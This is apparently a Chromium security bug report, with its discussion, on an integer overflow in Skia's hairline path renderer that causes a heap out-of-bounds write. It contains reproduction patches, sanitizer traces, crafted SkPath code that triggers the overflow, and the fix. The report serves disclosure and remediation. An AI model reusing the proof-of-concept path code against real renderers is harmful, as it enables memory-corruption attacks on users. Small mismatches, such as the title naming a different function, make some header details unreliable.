# [Skia] Integer overflow in MeshOp::onCombineIfPossible

| Field | Value |
|-------|-------|
| **Issue ID** | [382786791](https://issues.chromium.org/issues/382786791) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Skia |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **CVE IDs** | CVE-2023-6345 |
| **Reporter** | hy...@gmail.com |
| **Assignee** | mi...@google.com |
| **Created** | 2024-12-08 |
| **Bounty** | $15,000.00 |

## Description

# Steps to reproduce the problem

1. [optional] apply skia patch (only accelerate the computation to enhance bug reproduce)
2. build skpbench with ubsan
3. run script to generate path.skp and run ./skpbench --src poc/path.skp --config gles

# Problem Description

In function `AAHairlineOp::onPrepareDraws`, the `quadCount` iterate every path and add `gather_lines_and_quads`, which can be controlled by `fPath`. by creating crafted skia path, we're able to increase the `gather_lines_and_quads` results to 0xf0f4 in the poc. and there are no additional verification for the `quadCount` to prevent overflow.

```
    int instanceCount = fPaths.size();
    bool convertConicsToQuads = !target->caps().shaderCaps()->fFloatIs32Bits;
    for (int i = 0; i < instanceCount; i++) {
        const PathData& args = fPaths[i];
        int quadCount += gather_lines_and_quads(args.fPath, args.fViewMatrix, args.fDevClipBounds,
                                             args.fCapLength, convertConicsToQuads, &lines, &quads,
                                             &conics, &qSubdivs, &cWeights);
        // [1] gather_lines_and_quads can be super large (e.g. 0xf0f4)
        // therefore the quadCount may overflow
    }

```

Subsequently, the `quadCount` is used for allocation at [2-3], endup being used to allocate
buffer at [4]. Therefore, the OOB will happen at [5]

```

    int quadAndConicCount = conicCount + quadCount;          //[2]

    static constexpr int kMaxLines = SK_MaxS32 / kLineSegNumVertices;
    static constexpr int kMaxQuadsAndConics = SK_MaxS32 / kQuadNumVertices;
    if (lineCount > kMaxLines || quadAndConicCount > kMaxQuadsAndConics) {
        return;
    }

        int vertexCount = kQuadNumVertices * quadAndConicCount; // [3]
        void* vertices = target->makeVertexSpace(sizeof(BezierVertex), vertexCount, &vertexBuffer,
                                                 &firstVertex); // [4]

        if (!vertices || !quadsIndexBuffer) {
            SkDebugf("Could not allocate vertices\n");
            return;
        }

        BezierVertex* bezVerts = reinterpret_cast<BezierVertex*>(vertices);

        int unsubdivQuadCnt = quads.size() / 3;
        for (int i = 0; i < unsubdivQuadCnt; ++i) {
            SkASSERT(qSubdivs[i] >= 0);
            if (!quads[3*i].isFinite() || !quads[3*i+1].isFinite() || !quads[3*i+2].isFinite()) {
                return;
            }
            add_quads(&quads[3*i], qSubdivs[i], toDevice, toSrc, &bezVerts); //[5]
        }


```
# Summary

Security: Skia integer overflow (results in OOB) at AAHairlineOp::onPrepareDraws

# Custom Questions

#### Type of crash:

gpu

#### Reporter credit:

Han Zheng (HexHive)

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A

## Attachments

- [genskpic.py](attachments/genskpic.py) (text/x-python, 4.9 KB)

## Timeline

### kd...@gmail.com (2024-12-08)

patch: this patch only accelrate the execution and does not change any value, as we use the same command in `read` at generated skp file and the computation are same

```
diff --git a/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp b/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp
index 3527904439..3544758aca 100644
--- a/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp
+++ b/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp
@@ -1221,11 +1221,15 @@ void AAHairlineOp::onPrepareDraws(GrMeshDrawTarget* target) {
     bool convertConicsToQuads = !target->caps().shaderCaps()->fFloatIs32Bits;
     for (int i = 0; i < instanceCount; i++) {
         const PathData& args = fPaths[i];
-        quadCount += gather_lines_and_quads(args.fPath, args.fViewMatrix, args.fDevClipBounds,
-                                            args.fCapLength, convertConicsToQuads, &lines, &quads,
-                                            &conics, &qSubdivs, &cWeights);
+        //int curQuadCount = gather_lines_and_quads(args.fPath, args.fViewMatrix, args.fDevClipBounds,
+        //                                    args.fCapLength, convertConicsToQuads, &lines, &quads,
+        //                                    &conics, &qSubdivs, &cWeights);
+       //SkDebugf("[AAHairlineOp::onPrepareDraws] curQuadCount %llx, quadCount %llx\n", curQuadCount, quadCount);
+       int curQuadCount = 0xf0f4;
+       quadCount += curQuadCount;
     }
 
+    SkDebugf("passing...\n");
     int lineCount = lines.size() / 2;
     int conicCount = conics.size() / 3;
     int quadAndConicCount = conicCount + quadCount;


```

the UBSAN error:

```
path.skp is too large (2800x2800), cropping to 2048x2048.
../../src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp:1229:12: runtime error: signed integer overflow: 2147466776 + 61684 cannot be represented in type 'int'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior ../../src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp:1229:12 

```

### kd...@gmail.com (2024-12-08)

the script to generate the skp file for testing. the attack model of this bug is assume the attacker has a compromised renderer, which is same as [b/360265320](https://issues.chromium.org/issues/360265320)

### kd...@gmail.com (2024-12-08)

BTW, my patch have a side-effect, it remove the write to quads, lines, conics, further results in no OOB write.

```
        int quadCount += gather_lines_and_quads(args.fPath, args.fViewMatrix, args.fDevClipBounds,
                                             args.fCapLength, convertConicsToQuads, &lines, &quads,
                                             &conics, &qSubdivs, &cWeights); // patch remove this line to speed up calculation
/*            ------------------------------------------------------------------------             */
        int unsubdivQuadCnt = quads.size() / 3; 
// OOB suppose to happen there, but the unsubdivQuadCnt is 0 because of our patch
// if we don't patch, the reproduction will be slow, but the OOB should happen
        for (int i = 0; i < unsubdivQuadCnt; ++i) { 
            SkASSERT(qSubdivs[i] >= 0);
            if (!quads[3*i].isFinite() || !quads[3*i+1].isFinite() || !quads[3*i+2].isFinite()) {
                return;
            }
            add_quads(&quads[3*i], qSubdivs[i], toDevice, toSrc, &bezVerts);
        }

```

But IMO my patch will not affect the `quadCount` value, and is used only for demonstrating the interger overflow existence. You may try to run without patch, that will demonstrate the OOB (only make the reproduce super slow).

### kd...@gmail.com (2024-12-08)

To demonstrate its capability to OOB write, I write a new patch that

1. converting results to `int`, which prevent UBSAN crash early
2. write the first 10 quads. Theorically the allocated size should holds all quads.size() quads, which is much higher than 10,
   I patch the program that only write 10 quads, to ensure it reproduce fast enough, but still trigger the bug
   new patch:

```
diff --git a/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp b/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp
index 3527904439..43352b0c5e 100644
--- a/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp
+++ b/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp
@@ -1221,9 +1221,21 @@ void AAHairlineOp::onPrepareDraws(GrMeshDrawTarget* target) {
     bool convertConicsToQuads = !target->caps().shaderCaps()->fFloatIs32Bits;
     for (int i = 0; i < instanceCount; i++) {
         const PathData& args = fPaths[i];
-        quadCount += gather_lines_and_quads(args.fPath, args.fViewMatrix, args.fDevClipBounds,
+
+        size_t value = 0xf0f4;
+       
+       if (i <= 10) {
+               int tmp = gather_lines_and_quads(args.fPath, args.fViewMatrix, args.fDevClipBounds,
                                             args.fCapLength, convertConicsToQuads, &lines, &quads,
                                             &conics, &qSubdivs, &cWeights);
+               if (tmp != value) {
+                       SkDebugf("the given skp file does not produce 0xf0f4 quads!\n");
+                       SkASSERT_RELEASE(0);
+
+               }
+       }
+       value = (value + quadCount) % 0xFFFFFFFF;
+       quadCount = static_cast<int>(value);
     }
 
     int lineCount = lines.size() / 2;


```

StackTrace

```
path.skp is too large (2800x2800), cropping to 2048x2048.
=================================================================
==2659262==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f7de0c6a820 at pc 0x5636c1119fee bp 0x7ffe03129ed0 sp 0x7ffe03129690
WRITE of size 120 at 0x7f7de0c6a820 thread T0
    #0 0x5636c1119fed in __asan_memcpy (/path/to/skia/out/fuzz/skpbench+0x2165fed) (BuildId: aaa98ec4a4e60b5ddd521a60a9900eb82801687d)
    #1 0x5636c291eef2 in (anonymous namespace)::add_quads(SkPoint const*, int, SkMatrix const*, SkMatrix const*, (anonymous namespace)::BezierVertex**) /path/to/skia/out/fuzz/../../src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp:739:9
    #2 0x5636c2911cf3 in (anonymous namespace)::AAHairlineOp::onPrepareDraws(GrMeshDrawTarget*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp:1299:13
    #3 0x5636c2a7971c in GrMeshDrawOp::onPrepare(GrOpFlushState*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/ops/GrMeshDrawOp.cpp:27:61
    #4 0x5636c2b43b27 in GrOp::prepare(GrOpFlushState*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/ops/GrOp.h:197:15
    #5 0x5636c2b1f3a5 in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #6 0x5636c258bdbb in GrRenderTask::prepare(GrOpFlushState*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrRenderTask.cpp:111:11
    #7 0x5636c2438a36 in GrDrawingManager::executeRenderTasks(GrOpFlushState*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #8 0x5636c243390d in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #9 0x5636c243bdf6 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrDrawingManager.cpp:536:27
    #10 0x5636c23de86e in GrDirectContext::flush(GrFlushInfo const&) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrDirectContext.cpp:448:36
    #11 0x5636c11886ef in flush_with_sync(GrDirectContext*, GpuSync&) /path/to/skia/out/fuzz/../../tools/skpbench/skpbench.cpp:677:14
    #12 0x5636c118845a in draw_skp_and_flush_with_sync(GrDirectContext*, SkSurface*, SkPicture const*, GpuSync&) /path/to/skia/out/fuzz/../../tools/skpbench/skpbench.cpp:686:5
    #13 0x5636c11b1c65 in StaticSkp::drawAndFlushAndSync(GrDirectContext*, SkSurface*, GpuSync&) /path/to/skia/out/fuzz/../../tools/skpbench/skpbench.cpp:159:9
    #14 0x5636c1185b78 in run_benchmark(GrDirectContext*, sk_sp<SkSurface>, SkpProducer*, std::__1::vector<Sample, std::__1::allocator<Sample>>*) /path/to/skia/out/fuzz/../../tools/skpbench/skpbench.cpp:361:20
    #15 0x5636c1182ea4 in main /path/to/skia/out/fuzz/../../tools/skpbench/skpbench.cpp:637:13
    #16 0x7f7e13229d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #17 0x7f7e13229e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #18 0x5636c107cf34 in _start (/path/to/skia/out/fuzz/skpbench+0x20c8f34) (BuildId: aaa98ec4a4e60b5ddd521a60a9900eb82801687d)

0x7f7de0c6a820 is located 0 bytes after 25165856-byte region [0x7f7ddf46a800,0x7f7de0c6a820)
allocated by thread T0 here:
    #0 0x5636c115c6fd in operator new(unsigned long) (/path/to/skia/out/fuzz/skpbench+0x21a86fd) (BuildId: aaa98ec4a4e60b5ddd521a60a9900eb82801687d)
    #1 0x5636c4345f3e in GrCpuBuffer::Make(unsigned long) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrCpuBuffer.h:29:20
    #2 0x5636c4331e84 in GrBufferAllocPool::CpuBufferCache::makeBuffer(unsigned long, bool) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrBufferAllocPool.cpp:56:30
    #3 0x5636c4337cfe in GrBufferAllocPool::resetCpuData(unsigned long) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrBufferAllocPool.cpp:389:60
    #4 0x5636c433e87c in GrBufferAllocPool::createBlock(unsigned long) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrBufferAllocPool.cpp:362:15
    #5 0x5636c433bbb8 in GrBufferAllocPool::makeSpace(unsigned long, unsigned long, sk_sp<GrBuffer const>*, unsigned long*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrBufferAllocPool.cpp:229:16
    #6 0x5636c4342ea7 in GrVertexBufferAllocPool::makeSpace(unsigned long, int, sk_sp<GrBuffer const>*, int*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrBufferAllocPool.cpp:445:28
    #7 0x5636c2503a34 in GrOpFlushState::makeVertexSpace(unsigned long, int, sk_sp<GrBuffer const>*, int*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrOpFlushState.cpp:190:24
    #8 0x5636c2a7b37c in GrMeshDrawOp::PatternHelper::init(GrMeshDrawTarget*, GrPrimitiveType, unsigned long, sk_sp<GrBuffer const>, int, int, int, int) /path/to/skia/out/fuzz/../../src/gpu/ganesh/ops/GrMeshDrawOp.cpp:103:25
    #9 0x5636c2a7adf7 in GrMeshDrawOp::PatternHelper::PatternHelper(GrMeshDrawTarget*, GrPrimitiveType, unsigned long, sk_sp<GrBuffer const>, int, int, int, int) /path/to/skia/out/fuzz/../../src/gpu/ganesh/ops/GrMeshDrawOp.cpp:82:11
    #10 0x5636c291108c in (anonymous namespace)::AAHairlineOp::onPrepareDraws(GrMeshDrawTarget*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp:1258:37
    #11 0x5636c2a7971c in GrMeshDrawOp::onPrepare(GrOpFlushState*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/ops/GrMeshDrawOp.cpp:27:61
    #12 0x5636c2b43b27 in GrOp::prepare(GrOpFlushState*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/ops/GrOp.h:197:15
    #13 0x5636c2b1f3a5 in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #14 0x5636c258bdbb in GrRenderTask::prepare(GrOpFlushState*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrRenderTask.cpp:111:11
    #15 0x5636c2438a36 in GrDrawingManager::executeRenderTasks(GrOpFlushState*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #16 0x5636c243390d in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #17 0x5636c243bdf6 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrDrawingManager.cpp:536:27
    #18 0x5636c23de86e in GrDirectContext::flush(GrFlushInfo const&) /path/to/skia/out/fuzz/../../src/gpu/ganesh/GrDirectContext.cpp:448:36
    #19 0x5636c11886ef in flush_with_sync(GrDirectContext*, GpuSync&) /path/to/skia/out/fuzz/../../tools/skpbench/skpbench.cpp:677:14
    #20 0x5636c118845a in draw_skp_and_flush_with_sync(GrDirectContext*, SkSurface*, SkPicture const*, GpuSync&) /path/to/skia/out/fuzz/../../tools/skpbench/skpbench.cpp:686:5
    #21 0x5636c11b1c65 in StaticSkp::drawAndFlushAndSync(GrDirectContext*, SkSurface*, GpuSync&) /path/to/skia/out/fuzz/../../tools/skpbench/skpbench.cpp:159:9
    #22 0x5636c1185b78 in run_benchmark(GrDirectContext*, sk_sp<SkSurface>, SkpProducer*, std::__1::vector<Sample, std::__1::allocator<Sample>>*) /path/to/skia/out/fuzz/../../tools/skpbench/skpbench.cpp:361:20
    #23 0x5636c1182ea4 in main /path/to/skia/out/fuzz/../../tools/skpbench/skpbench.cpp:637:13
    #24 0x7f7e13229d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-buffer-overflow (/path/to/skia/out/fuzz/skpbench+0x2165fed) (BuildId: aaa98ec4a4e60b5ddd521a60a9900eb82801687d) in __asan_memcpy
Shadow bytes around the buggy address:
  0x7f7de0c6a580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f7de0c6a600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f7de0c6a680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f7de0c6a700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7f7de0c6a780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7f7de0c6a800: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa
  0x7f7de0c6a880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7f7de0c6a900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7f7de0c6a980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7f7de0c6aa00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7f7de0c6aa80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2659262==ABORTING



```

### kd...@gmail.com (2024-12-09)

## suggested patch

```
diff --git a/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp b/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp
index 3527904439..872eefd65c 100644
--- a/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp
+++ b/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp
@@ -1221,9 +1221,14 @@ void AAHairlineOp::onPrepareDraws(GrMeshDrawTarget* target) {
     bool convertConicsToQuads = !target->caps().shaderCaps()->fFloatIs32Bits;
     for (int i = 0; i < instanceCount; i++) {
         const PathData& args = fPaths[i];
-        quadCount += gather_lines_and_quads(args.fPath, args.fViewMatrix, args.fDevClipBounds,
+
+        int tmpQuadCount = gather_lines_and_quads(args.fPath, args.fViewMatrix, args.fDevClipBounds,
                                             args.fCapLength, convertConicsToQuads, &lines, &quads,
                                             &conics, &qSubdivs, &cWeights);
+        if (SK_MaxS32 - tmpQuadCount < quadCount) {
+            return;
+        }
+        quadCount += tmpQuadCount;
     }
 
     int lineCount = lines.size() / 2;


```
## Bisec

The problem exists since AAHairLinePathRenderer's introduce commit `719239cd69439fff61ba7a58e0524d40aa061e73`.

### dr...@chromium.org (2024-12-09)

[security triage] It seems like these bugs are not typically reproduced by the security shepherd, so assuming this reproduces as claimed.

jamesgk@ - I couldn't find any documentation on building skpbench and I couldn't get it working in my local chromium checkout. If it's likely I can reproduce this myself, let me know. I'm happy to write up the documentation so we can validate these bugs more thoroughly before passing them along.

### kd...@gmail.com (2024-12-09)

hi, skpbench can only be build in skia, chrome source code does not have most of the skia so you may need to download the standalone skia and build.

theorically we can apply a chrome patch to simulate a compomised renderer, just like [b/360265320](https://issues.chromium.org/issues/360265320) do. but imo the skpbench can demonstrate it, just like what pzero blog did:<https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2023/CVE-2023-6345.html>

### pe...@google.com (2024-12-10)

Setting milestone because of s0/s1 severity.

### ja...@google.com (2024-12-10)

Yea the general instructions for building Skia test apps are at <https://skia.org/docs/user/build/>; In this case we want to build the `skpbench` target. And since we need UBSAN you can add the arg `sanitize = "undefined"` when generating the build files (or `sanitize = "ASAN"` which includes address & undefined behavior sanitization).

I can reproduce this with the patch from [comment#5](https://issues.chromium.org/issues/382786791#comment5) but haven't waited long enough for a reproduction with the SKP generated with the script from [comment#3](https://issues.chromium.org/issues/382786791#comment3) (not sure how long you'd have to wait for that).

### kd...@gmail.com (2024-12-11)

Thanks for verifying the reproduce!

> not sure how long you'd have to wait for that

TBH I didn't try waiting for the unpatched version to finish, my expectation is this will be extremely slow as I don't have a dedicated graphic card on my PC.

My assumption is that this can be optimized by using different combinations of paths and iterations, i.e., reducing the `gather_lines_and_quads` return value and increasing the number of paths.

Now the patch in #5 should demonstrate the bug's existence (as the patch does not change the `quadCount` value), so it can be fixed without waiting for a stable poc (I'm trying to reduce the time, but I guess it will take times).

### ja...@google.com (2024-12-12)

In this case I don't think the actual GPU is relevant as the code in question is accumulating draw data on the CPU. But running the SKP for a while and noting the progress, it seems it would take on the order of days or possibly weeks of continuous running for the overflow to trigger on my computer, as it stands.

### kd...@gmail.com (2024-12-13)

> the code in question is accumulating draw data on the CPU

ok thanks for the clarification, in this case I agree that this would take days or more. what I observed is the same and my PC is i7-13700+64GB so neither CPU nor Memory should be bottleneck

Another thing I notice:

```
     int conicCount = conics.size() / 3; // updated in gather_lines_and_quads
     int quadAndConicCount = conicCount + quadCount;

```

this is also a potential overflow place that needs a patch.
It may reduce the required time to exploit (not magnitude level, but something like from 3day to 2day, as attacker only need to achieve INT\_MAX \* 2/3 in the `for` loop, and the rest 1/3 INT\_MAX can be add there)
it's a potential security flaw, therefore it's good to add a verification there.

### ja...@google.com (2024-12-16)

I tried reproducing this on a regular release build, which is much faster than an ASAN build. I realized that the size of `quads` (and `conics`) is bound by INT\_MAX here: <https://crsrc.org/c/third_party/skia/include/private/base/SkTArray.h;l=710;drc=f5e280b6>

Since in the `quads` case this size is always 3 \* `quadCount`, this release check will always fire before `quadCount` is able to overflow. It is however possible to trigger overflow by drawing very-nearly-quadratic curves which get subdivided here: <https://crsrc.org/c/third_party/skia/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp;l=360;drc=f5e280b6>

This takes a delicate balance of increasing `quadCount` enough to overflow without increasing `quads`'s size enough to overflow. The following seems to work:

```
    SkPaint paint;
    paint.setAntiAlias(true);
    paint.setStyle(SkPaint::kStroke_Style);
    paint.setStrokeWidth(0);
    
    SkPath path;
    path.moveTo(0, 0);
    for (float y = 0.0f; y < 200.0f; y += 0.01f) {
        const float y1 = y + 200.0f;
        constexpr float x0 = 0.0f;
        constexpr float x1 = 400.0f / 3.0f; 
        constexpr float x2 = 800.0f / 3.0f;
        constexpr float x3 = 400.0f;
        path.cubicTo(x1, y1, x2, y1, x3, y);
        path.cubicTo(x2, y1 + 0.005f, x1, y1 + 0.005f, x0, y + 0.005f);
    }   
    path.close();    
                                            
    for (int i = 0; i < 15000; ++i) {
        canvas->drawPath(path, paint);
    }

```

However, I'm not sure if this by itself is enough to trigger an OOB read, because the count is cast to size\_t before being used for an allocation here: <https://crsrc.org/c/third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp;l=445;drc=f5e280b6>

### kd...@gmail.com (2024-12-17)

> However, I'm not sure if this by itself is enough to trigger an OOB read, because the count is cast to size\_t before being used for an allocation here: <https://crsrc.org/c/third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp;l=445;drc=f5e280b6>

I don't get your point there,

```
    for (...) {

        quadCount += gather_lines_and_quads(args.fPath, args.fViewMatrix, args.fDevClipBounds,
                                            args.fCapLength, convertConicsToQuads, &lines, &quads,
                                            &conics, &qSubdivs, &cWeights);  //[1]
    }
// -----------------------------------------------------------------------------
    int quadAndConicCount = conicCount + quadCount; [2]
    if (lineCount > kMaxLines || quadAndConicCount > kMaxQuadsAndConics) {
        return;
    }
// -----------------------------------------------------------------------------

        int vertexCount = kQuadNumVertices * quadAndConicCount;
// -----------------------------------------------------------------------------

        void* vertices = target->makeVertexSpace(sizeof(BezierVertex), vertexCount, // [3]
                                                 &vertexBuffer, &firstVertex); 
->GrOpFlushState::makeVertexSpace
->GrVertexBufferAllocPool::makeSpace(

```

My understanding is that overflow happens either at [1] or [2], so at [3], the vertexCount is already down-casted (overflowed) to an valid int. Therefore, the argument passed to `GrVertexBufferAllocPool::makeSpace(` being casted to `size_t` will not lead to any differences.

For instance, at [2] the quadCount is MAX\_INT and conicCount is 0x10, then the quadAndConicCount will be downcast to 0xF (overflow),  

end up leading the `vertexCount` at [3] being `0xF * kQuadNumVertices`, no matter if this value is cast to `size_t`, the buffer allocated in [3] will be too small to hold the temporary calculation results.

### ja...@google.com (2024-12-17)

I mostly agree with your analysis, however an important point is that at [2], if `quadCount` is INT\_MAX, the calculation will actually be 0x7FFFFFFF + 0x10. Then we end up with `quadAndConicCount` equal to 0x8000000F, or -2147483633. So we actually have to increase `quadCount` well beyond INT\_MAX. We can do that by drawing even larger curves which are subdivided more than those in my first example. The following code seems to result in an OOB read by wrapping `quadCount` back to a relatively small positive value:

```
    SkPath path;
    path.moveTo(0, 0);
    for (float y = 0.0f; y < 800.0f; y += 0.05f) {
        const float y1 = y + 800.0f;
        constexpr float x0 = 0.0f;
        constexpr float x1 = 1600.0f / 3.0f;
        constexpr float x2 = 3200.0f / 3.0f;
        constexpr float x3 = 1600.0f;
        path.cubicTo(x1, y1, x2, y1, x3, y);
        path.cubicTo(x2, y1 + 0.025f, x1, y1 + 0.025f, x0, y + 0.025f);
    }
    path.close();

    for (int i = 0; i < 8500; ++i) {
        canvas->drawPath(path, paint);
    }

```

### ja...@google.com (2024-12-17)

Note that since an ASAN build was too slow to reproduce this, I used the following patch to verify an OOB write:

```
--- a/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp
+++ b/src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp
@@ -701,6 +701,8 @@ void add_conics(const SkPoint p[3],
     }
 }
 
+const BezierVertex* dbg_end = nullptr;
+
 void add_quads(const SkPoint p[3],
                int subdiv,
                const SkMatrix* toDevice,
@@ -727,6 +729,7 @@ void add_quads(const SkPoint p[3],
 
         if (bloat_quad(choppedQuadPts, toDevice, toSrc, outVerts)) {
             set_uv_quad(choppedQuadPts, outVerts);
+            SkASSERT_RELEASE(*vert <= dbg_end - kQuadNumVertices);
             memcpy(*vert, outVerts, kQuadNumVertices * sizeof(BezierVertex));
             *vert += kQuadNumVertices;
         }
@@ -1289,6 +1292,7 @@ void AAHairlineOp::onPrepareDraws(GrMeshDrawTarget* target) {
 
         // Setup vertices
         BezierVertex* bezVerts = reinterpret_cast<BezierVertex*>(vertices);
+        dbg_end = bezVerts + vertexCount;
 
         int unsubdivQuadCnt = quads.size() / 3;
         for (int i = 0; i < unsubdivQuadCnt; ++i) {

```

### ap...@google.com (2024-12-17)

Project: skia  

Branch: main  

Author: James Godfrey-Kittle <[jamesgk@google.com](mailto:jamesgk@google.com)>  

Link:      <https://skia-review.googlesource.com/930577>

[ganesh] Avoid overflow when combining AAHairlineOps

---


Expand for full commit details
```
[ganesh] Avoid overflow when combining AAHairlineOps 
 
Bug: b/382786791 
Change-Id: I955d943015cce76f75221df9fab0897a6f22fe4b 
Reviewed-on: https://skia-review.googlesource.com/c/skia/+/930577 
Reviewed-by: Michael Ludwig <michaelludwig@google.com> 
Commit-Queue: James Godfrey-Kittle <jamesgk@google.com>

```

---

Files:

- M `src/gpu/ganesh/ops/AAHairLinePathRenderer.cpp`

---

Hash: 8b030e47588af50f56ef380d81a17667baeb582b  

Date:  Tue Dec 17 12:14:17 2024


---

### ph...@chromium.org (2024-12-31)

I'm not entirely sure how to reproduce this. jamesgk@: Could you confirm whether <https://skia-review.googlesource.com/930577> fixes this bug please?

### pe...@google.com (2025-01-01)

jamesgk: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### mi...@google.com (2025-01-02)

Yes, that CL fixed the issue.

### pe...@google.com (2025-01-02)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M131. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M132. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [131, 132].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
